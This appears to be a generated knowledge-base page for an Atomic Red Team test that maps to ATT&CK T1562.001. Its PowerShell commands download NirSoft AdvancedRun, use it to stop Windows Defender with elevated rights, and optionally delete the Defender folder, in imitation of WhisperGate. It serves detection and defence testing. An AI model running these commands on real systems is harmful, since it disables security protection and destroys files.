---
atomic_guid: "81ce22fd-9612-4154-918e-8a1f285d214d"
title: "Disable Defender Using NirSoft AdvancedRun"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "81ce22fd-9612-4154-918e-8a1f285d214d"
  - "Disable Defender Using NirSoft AdvancedRun"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Disable Defender Using NirSoft AdvancedRun

Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html
This Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.
See https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3
Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk.

## Metadata

- Atomic GUID: 81ce22fd-9612-4154-918e-8a1f285d214d
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Input Arguments

### AdvancedRun_Location

- description: Path of Advanced Run executable
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe

### delete_defender_folder

- description: Set to 1 to also delete the Windows Defender folder
- type: integer
- default: 0

## Dependencies

Advancedrun.exe must exist at #{AdvancedRun_Location}

### Prerequisite Check

```powershell
if(Test-Path -Path "#{AdvancedRun_Location}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"
Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -Force
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
if(#{delete_defender_folder}){
  $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse
  Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
}
```

### Cleanup

```powershell
Try {cmd /c "#{AdvancedRun_Location}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
